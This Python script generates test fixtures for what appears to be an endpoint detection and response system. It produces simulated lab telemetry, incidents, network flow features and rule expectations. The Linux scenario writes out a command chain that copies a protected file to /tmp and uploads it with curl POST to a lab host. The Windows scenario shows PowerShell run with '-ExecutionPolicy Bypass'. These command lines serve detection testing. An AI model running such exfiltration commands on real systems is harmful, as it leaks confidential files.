#!/usr/bin/env python3
"""Generates the canonical fixtures in contracts/fixtures/ from the Pydantic models.

Run from repo root:  python tools/generate_fixtures.py
The fixtures are committed; this script exists so they can be regenerated consistently
when the contracts change (bump schema_version first).
"""
from __future__ import annotations

import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from nexus_contracts import (  # noqa: E402
    HostEvent, FileInfo, NetworkInfo, HostConnection, ProcessNode, Relationship, EvidenceItem, Gap, RuleMatch,
    LocalResponse, Incident, GatewayConnection, NfLite1, MLPrediction, FlowRecord, ResponseCommand, ResponseParams,
    ResponseResult, Heartbeat, Correlation, Enrichment, ServerBlock, ServerIncidentView,
)
from nexus_contracts.models import NetworkEvidence, ResponseHistoryItem  # noqa: E402

FIX = ROOT / "contracts" / "fixtures"
(FIX / "rules").mkdir(parents=True, exist_ok=True)


def dump(path: Path, obj):
    path.write_text(json.dumps(obj, indent=2) + "\n", encoding="utf-8")


def jsonl(path: Path, items):
    path.write_text("".join(json.dumps(i) + "\n" for i in items), encoding="utf-8")


# ---------------------------------------------------------------- Linux scenario L1
EP = "linux-vm-01"
T0 = "2026-11-15T10:30:0{s}.{ms}Z"


def t(sec: int, ms: int = 0) -> str:
    return f"2026-11-15T10:30:{sec:02d}.{ms:03d}Z"


py = f"{EP}:exec-py01"
bash = f"{EP}:exec-bash01"
cat = f"{EP}:exec-cat01"
curl = f"{EP}:exec-curl01"
sysd = f"{EP}:exec-systemd-user"

lin_events = [
    HostEvent(event_id=f"{EP}:evt-000000000001", endpoint_id=EP, os="linux", timestamp_utc=t(1, 120),
              event_type="process_start", process_instance_id=py, parent_process_instance_id=sysd, pid=4210, ppid=1800,
              binary="/usr/bin/python3", command_line="python3 /lab/scenarios/l1_stage_and_send.py", user="lab",
              sha256="a" * 64, process_start_time_utc=t(1, 120),
              attributes={"sensor": "tetragon", "identity_resolution": "native"}),
    HostEvent(event_id=f"{EP}:evt-000000000002", endpoint_id=EP, os="linux", timestamp_utc=t(2, 5),
              event_type="process_start", process_instance_id=bash, parent_process_instance_id=py, pid=4211, ppid=4210,
              binary="/usr/bin/bash", command_line="bash -c cat /lab/protected/confidential.txt > /tmp/.x", user="lab",
              sha256="b" * 64, process_start_time_utc=t(2, 5), attributes={"sensor": "tetragon"}),
    HostEvent(event_id=f"{EP}:evt-000000000003", endpoint_id=EP, os="linux", timestamp_utc=t(2, 30),
              event_type="process_start", process_instance_id=cat, parent_process_instance_id=bash, pid=4212, ppid=4211,
              binary="/usr/bin/cat", command_line="cat /lab/protected/confidential.txt", user="lab",
              sha256="c" * 64, process_start_time_utc=t(2, 30), attributes={"sensor": "tetragon"}),
    HostEvent(event_id=f"{EP}:evt-000000000004", endpoint_id=EP, os="linux", timestamp_utc=t(2, 41),
              event_type="file_access", process_instance_id=cat, parent_process_instance_id=bash, pid=4212, ppid=4211,
              binary="/usr/bin/cat", user="lab", file=FileInfo(path="/lab/protected/confidential.txt", operation="read"),
              attributes={"sensor": "tetragon", "sensor_event_id": "security_file_permission"}),
    HostEvent(event_id=f"{EP}:evt-000000000005", endpoint_id=EP, os="linux", timestamp_utc=t(2, 60),
              event_type="process_exit", process_instance_id=cat, parent_process_instance_id=bash, pid=4212, ppid=4211,
              binary="/usr/bin/cat", attributes={"sensor": "tetragon"}),
    HostEvent(event_id=f"{EP}:evt-000000000006", endpoint_id=EP, os="linux", timestamp_utc=t(5, 900),
              event_type="process_start", process_instance_id=curl, parent_process_instance_id=bash, pid=4215, ppid=4211,
              binary="/usr/bin/curl",
              command_line="curl -s -X POST --data-binary @/tmp/.x http://192.168.20.10:8443/upload", user="lab",
              sha256="d" * 64, process_start_time_utc=t(5, 900), attributes={"sensor": "tetragon"}),
    HostEvent(event_id=f"{EP}:evt-000000000007", endpoint_id=EP, os="linux", timestamp_utc=t(6, 0),
              event_type="network_connect", process_instance_id=curl, parent_process_instance_id=bash, pid=4215, ppid=4211,
              binary="/usr/bin/curl", user="lab",
              network=NetworkInfo(protocol="TCP", src_ip="192.168.10.10", src_port=51542, dst_ip="192.168.20.10",
                                  dst_port=8443, direction="outbound"),
              attributes={"sensor": "tetragon", "sensor_event_id": "tcp_connect"}),
]
jsonl(FIX / "linux_l1_events.jsonl", [e.model_dump(mode="json", exclude_none=True) for e in lin_events])

evidence = [EvidenceItem(event_id=e.event_id, role="matched" if e.event_id.endswith(("01", "02", "04", "07")) else "context", event=e)
            for e in lin_events]

incident = Incident(
    incident_id=f"{EP}:INC-20261115T103007-0001", incident_version=1, endpoint_id=EP, os="linux", status="open",
    detected_at_utc=t(7, 0), updated_at_utc=t(7, 0), severity="high", confidence="high",
    title="python3 → bash → read /lab/protected/confidential.txt → curl to 192.168.20.10:8443",
    rule_matches=[RuleMatch(rule_id="NX-LIN-001", rule_version="1.0", matched_at_utc=t(7, 0),
                            bindings={"interp": lin_events[0].event_id, "shell": lin_events[1].event_id,
                                      "read": lin_events[3].event_id, "net": lin_events[6].event_id})],
    technique_ids=["T1059.004", "T1005", "T1041"],
    root_process_instance_id=py,
    process_nodes=[
        ProcessNode(process_instance_id=py, parent_process_instance_id=sysd, pid=4210, binary="/usr/bin/python3",
                    command_line="python3 /lab/scenarios/l1_stage_and_send.py", user="lab", sha256="a" * 64,
                    start_time_utc=t(1, 120), role="root"),
        ProcessNode(process_instance_id=bash, parent_process_instance_id=py, pid=4211, binary="/usr/bin/bash",
                    command_line="bash -c cat /lab/protected/confidential.txt > /tmp/.x", user="lab", sha256="b" * 64,
                    start_time_utc=t(2, 5), role="matched"),
        ProcessNode(process_instance_id=cat, parent_process_instance_id=bash, pid=4212, binary="/usr/bin/cat",
                    command_line="cat /lab/protected/confidential.txt", user="lab", sha256="c" * 64,
                    start_time_utc=t(2, 30), end_time_utc=t(2, 60), role="matched"),
        ProcessNode(process_instance_id=curl, parent_process_instance_id=bash, pid=4215, binary="/usr/bin/curl",
                    command_line="curl -s -X POST --data-binary @/tmp/.x http://192.168.20.10:8443/upload", user="lab",
                    sha256="d" * 64, start_time_utc=t(5, 900), role="matched"),
    ],
    relationships=[
        Relationship(**{"type": "PARENT_OF", "from": py, "to": bash, "basis": "observed", "evidence_event_ids": [lin_events[1].event_id]}),
        Relationship(**{"type": "PARENT_OF", "from": bash, "to": cat, "basis": "observed", "evidence_event_ids": [lin_events[2].event_id]}),
        Relationship(**{"type": "PARENT_OF", "from": bash, "to": curl, "basis": "observed", "evidence_event_ids": [lin_events[5].event_id]}),
        Relationship(**{"type": "ACCESSED_FILE", "from": cat, "to": "file:/lab/protected/confidential.txt", "basis": "observed", "evidence_event_ids": [lin_events[3].event_id]}),
        Relationship(**{"type": "CONNECTED_TO", "from": curl, "to": "net:192.168.20.10:8443/TCP", "basis": "observed", "evidence_event_ids": [lin_events[6].event_id]}),
    ],
    evidence=evidence,
    connections=[HostConnection(connection_id="conn-000123", process_instance_id=curl, protocol="TCP",
                                src_ip="192.168.10.10", src_port=51542, dst_ip="192.168.20.10", dst_port=8443,
                                direction="outbound", first_seen_utc=t(6, 0), evidence_event_ids=[lin_events[6].event_id])],
    gaps=[],
    local_response=LocalResponse(action="none", status="not_requested"),
    agent_version="0.1.0",
)
dump(FIX / "incident_linux_l1.json", incident.model_dump(mode="json", by_alias=True, exclude_none=True))

gw = GatewayConnection(gateway_connection_id="gw:conn-00500", protocol="TCP", orig_src_ip="192.168.10.10", orig_src_port=51542,
                       orig_dst_ip="192.168.20.10", orig_dst_port=8443, first_seen_utc=t(6, 12), last_seen_utc=t(8, 100),
                       ingress_interface="ens-lin", src_endpoint_id=EP, dst_endpoint_id="windows-vm-01",
                       packets_orig=9, bytes_orig=1812, packets_reply=7, bytes_reply=614, state="closed", flow_ids=["gw:flow-00500"])
dump(FIX / "gateway_connection_example.json", gw.model_dump(mode="json", exclude_none=True))

feat = NfLite1(protocol=6, l4_dst_port=8443, in_bytes=1812, out_bytes=614, in_pkts=9, out_pkts=7, flow_duration_ms=2088,
               duration_in_ms=2088, duration_out_ms=2010, tcp_flags=27, client_tcp_flags=27, server_tcp_flags=27,
               longest_flow_pkt=1118, shortest_flow_pkt=52, mean_pkt_size=151.625,
               src_to_dst_second_bytes=867.8160919540229, dst_to_src_second_bytes=305.4726368159204,
               src_to_dst_avg_throughput=6942.528735632184, dst_to_src_avg_throughput=2352.4904214559387,
               num_pkts_up_to_128_bytes=13, num_pkts_128_to_256_bytes=1, num_pkts_256_to_512_bytes=1,
               num_pkts_512_to_1024_bytes=0, num_pkts_1024_to_1514_bytes=1)
flow = FlowRecord(flow_id="gw:flow-00500", gateway_connection_id="gw:conn-00500", capture_interface="ens-lin", protocol=6,
                  src_ip="192.168.10.10", src_port=51542, dst_ip="192.168.20.10", dst_port=8443,
                  first_seen_utc=t(6, 12), last_seen_utc=t(8, 100), application_name="HTTP", features=feat,
                  ml=MLPrediction(label="benign", score=0.07, threshold=0.62, model_version="ids-rf-001", predicted_at_utc=t(23, 0)))
dump(FIX / "flow_record_example.json", flow.model_dump(mode="json", exclude_none=True))

# Feature-parity fixture: dataset-row form and NFStream-field form must both produce feat.vector()
dump(FIX / "flow_feature_fixture.json", {
    "feature_version": "nf-lite-1",
    "expected_vector": feat.vector(),
    "expected_names": list(feat.ORDER),
    "dataset_row": {
        "PROTOCOL": 6, "L4_DST_PORT": 8443, "IN_BYTES": 1812, "OUT_BYTES": 614, "IN_PKTS": 9, "OUT_PKTS": 7,
        "FLOW_DURATION_MILLISECONDS": 2088, "DURATION_IN": 2088, "DURATION_OUT": 2010, "TCP_FLAGS": 27,
        "CLIENT_TCP_FLAGS": 27, "SERVER_TCP_FLAGS": 27, "LONGEST_FLOW_PKT": 1118, "SHORTEST_FLOW_PKT": 52,
        "SRC_TO_DST_SECOND_BYTES": 867.8160919540229, "DST_TO_SRC_SECOND_BYTES": 305.4726368159204,
        "SRC_TO_DST_AVG_THROUGHPUT": 6942.528735632184, "DST_TO_SRC_AVG_THROUGHPUT": 2352.4904214559387,
        "NUM_PKTS_UP_TO_128_BYTES": 13, "NUM_PKTS_128_TO_256_BYTES": 1, "NUM_PKTS_256_TO_512_BYTES": 1,
        "NUM_PKTS_512_TO_1024_BYTES": 0, "NUM_PKTS_1024_TO_1514_BYTES": 1,
        "note": "mean_pkt_size is derived: (IN_BYTES+OUT_BYTES)/(IN_PKTS+OUT_PKTS). Rate columns here equal the live formula; see flow-features.md caveat."
    },
    "nflow_fields": {
        "protocol": 6, "dst_port": 8443, "src2dst_bytes": 1812, "dst2src_bytes": 614, "src2dst_packets": 9, "dst2src_packets": 7,
        "bidirectional_duration_ms": 2088, "src2dst_duration_ms": 2088, "dst2src_duration_ms": 2010,
        "bidirectional_max_ps": 1118, "bidirectional_min_ps": 52, "bidirectional_mean_ps": 151.625,
        "src2dst_syn_packets": 1, "src2dst_ack_packets": 8, "src2dst_psh_packets": 3, "src2dst_fin_packets": 1, "src2dst_rst_packets": 0, "src2dst_urg_packets": 0, "src2dst_ece_packets": 0, "src2dst_cwr_packets": 0,
        "dst2src_syn_packets": 1, "dst2src_ack_packets": 7, "dst2src_psh_packets": 2, "dst2src_fin_packets": 1, "dst2src_rst_packets": 0, "dst2src_urg_packets": 0, "dst2src_ece_packets": 0, "dst2src_cwr_packets": 0,
        "bidirectional_syn_packets": 2, "bidirectional_ack_packets": 15, "bidirectional_psh_packets": 5, "bidirectional_fin_packets": 2, "bidirectional_rst_packets": 0, "bidirectional_urg_packets": 0, "bidirectional_ece_packets": 0, "bidirectional_cwr_packets": 0,
        "udps": {"b128": 13, "b256": 1, "b512": 1, "b1024": 0, "b1514": 1}
    }
})

view = ServerIncidentView(
    incident=incident,
    server=ServerBlock(
        received_at_utc=t(7, 850),
        clock_offset_applied_ms=0.0,
        correlations=[Correlation(connection_id="conn-000123", state="matched", gateway_connection_id="gw:conn-00500",
                                  score=2.5, basis="observed", updated_utc=t(7, 900))],
        network_evidence=[NetworkEvidence(gateway_connection=gw, flows=[flow])],
        enrichment=[Enrichment(indicator_type="ip_port", value="192.168.20.10:8443", source="lab-indicators",
                               verdict="lab-test", tags=["lab-test", "scenario-l1"], fetched_utc=t(7, 900)),
                    Enrichment(indicator_type="sha256", value="a" * 64, source="malwarebazaar-offline", verdict="unknown",
                               fetched_utc=t(7, 900))],
        response_history=[],
        network_alert_ids=[],
    ),
)
dump(FIX / "server_incident_view_linux_l1.json", view.model_dump(mode="json", by_alias=True, exclude_none=True))

# ---------------------------------------------------------------- Windows scenario W1 events
WEP = "windows-vm-01"
cmdp = f"{WEP}:{{8f3c1a2e-1111-6a3f-0000-000000000100}}"
psp = f"{WEP}:{{8f3c1a2e-2222-6a3f-0000-000000000101}}"
win_events = [
    HostEvent(event_id=f"{WEP}:evt-00000000a001", endpoint_id=WEP, os="windows", timestamp_utc=t(10, 0),
              event_type="process_start", process_instance_id=cmdp, parent_process_instance_id=f"{WEP}:{{explorer-placeholder}}",
              pid=5120, ppid=3344, binary="C:\\Windows\\System32\\cmd.exe", command_line="cmd.exe /c C:\\Lab\\scenarios\\w1.cmd",
              user="LAB\\student", sha256="e" * 64, process_start_time_utc=t(10, 0),
              attributes={"sensor": "sysmon", "sensor_event_id": 1}),
    HostEvent(event_id=f"{WEP}:evt-00000000a002", endpoint_id=WEP, os="windows", timestamp_utc=t(10, 500),
              event_type="process_start", process_instance_id=psp, parent_process_instance_id=cmdp, pid=5133, ppid=5120,
              binary="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              command_line="powershell.exe -ExecutionPolicy Bypass -File C:\\Lab\\scenarios\\w1_stage.ps1",
              user="LAB\\student", sha256="f" * 64, process_start_time_utc=t(10, 500),
              attributes={"sensor": "sysmon", "sensor_event_id": 1}),
    HostEvent(event_id=f"{WEP}:evt-00000000a003", endpoint_id=WEP, os="windows", timestamp_utc=t(11, 200),
              event_type="file_access", process_instance_id=psp, parent_process_instance_id=cmdp, pid=5133, ppid=5120,
              binary="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", user="LAB\\student",
              file=FileInfo(path="C:\\Lab\\staging\\report.zip", operation="create"),
              attributes={"sensor": "sysmon", "sensor_event_id": 11}),
    HostEvent(event_id=f"{WEP}:evt-00000000a004", endpoint_id=WEP, os="windows", timestamp_utc=t(12, 0),
              event_type="network_connect", process_instance_id=psp, parent_process_instance_id=cmdp, pid=5133, ppid=5120,
              binary="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", user="LAB\\student",
              network=NetworkInfo(protocol="TCP", src_ip="192.168.20.10", src_port=49812, dst_ip="192.168.10.10",
                                  dst_port=8080, direction="outbound"),
              attributes={"sensor": "sysmon", "sensor_event_id": 3, "initiated": True}),
]
jsonl(FIX / "windows_w1_events.jsonl", [e.model_dump(mode="json", exclude_none=True) for e in win_events])

# ---------------------------------------------------------------- misc examples
dump(FIX / "heartbeat_example.json", Heartbeat(endpoint_id=EP, os="linux", sent_at_utc=t(0, 0), agent_version="0.1.0",
                                               ip_addresses=["192.168.10.10"], clock_offset_ms=-3.2, sensor_status="ok",
                                               events_per_minute=42.0, dropped_events=0, outbox_depth=0, dry_run=True).model_dump(mode="json", exclude_none=True))
cmd = ResponseCommand(command_id="cmd-0001", target_kind="endpoint", endpoint_id=EP, incident_id=incident.incident_id,
                      action="terminate_process", params=ResponseParams(process_instance_id=curl, pid=4215, binary="/usr/bin/curl"),
                      requested_by="user:anas", created_utc=t(30, 0), dry_run=True, status="queued")
dump(FIX / "response_command_example.json", cmd.model_dump(mode="json", exclude_none=True))
dump(FIX / "response_result_example.json", ResponseResult(command_id="cmd-0001", executed_utc=t(31, 0), status="denied", executor=EP,
                                                          detail={"reason": "not allowlisted", "pid": 4215, "binary": "/usr/bin/curl"}).model_dump(mode="json", exclude_none=True))

# ---------------------------------------------------------------- rule fixtures
jsonl(FIX / "rules" / "NX-LIN-001.events.jsonl", [e.model_dump(mode="json", exclude_none=True) for e in lin_events])
dump(FIX / "rules" / "NX-LIN-001.expect.json", {"rule_id": "NX-LIN-001", "fires": True,
                                                 "bindings": {"interp": lin_events[0].event_id, "shell": lin_events[1].event_id,
                                                              "read": lin_events[3].event_id, "net": lin_events[6].event_id},
                                                 "root_process_instance_id": py,
                                                 "expected_process_instance_ids": [py, bash, cat, curl]})
jsonl(FIX / "rules" / "NX-WIN-001.events.jsonl", [e.model_dump(mode="json", exclude_none=True) for e in win_events])
dump(FIX / "rules" / "NX-WIN-001.expect.json", {"rule_id": "NX-WIN-001", "fires": True,
                                                 "bindings": {"ps": win_events[1].event_id, "stage": win_events[2].event_id, "net": win_events[3].event_id},
                                                 "root_process_instance_id": cmdp,
                                                 "expected_process_instance_ids": [cmdp, psp]})
# negative fixture: benign python that only prints
benign = [HostEvent(event_id=f"{EP}:evt-00000000b001", endpoint_id=EP, os="linux", timestamp_utc=t(40, 0), event_type="process_start",
                    process_instance_id=f"{EP}:exec-py99", parent_process_instance_id=sysd, pid=5000, ppid=1800, binary="/usr/bin/python3",
                    command_line="python3 -c print(1)", user="lab", sha256="1" * 64, process_start_time_utc=t(40, 0))]
jsonl(FIX / "rules" / "NX-LIN-001.benign.events.jsonl", [e.model_dump(mode="json", exclude_none=True) for e in benign])
dump(FIX / "rules" / "NX-LIN-001.benign.expect.json", {"rule_id": "NX-LIN-001", "fires": False})

print("fixtures written to", FIX)
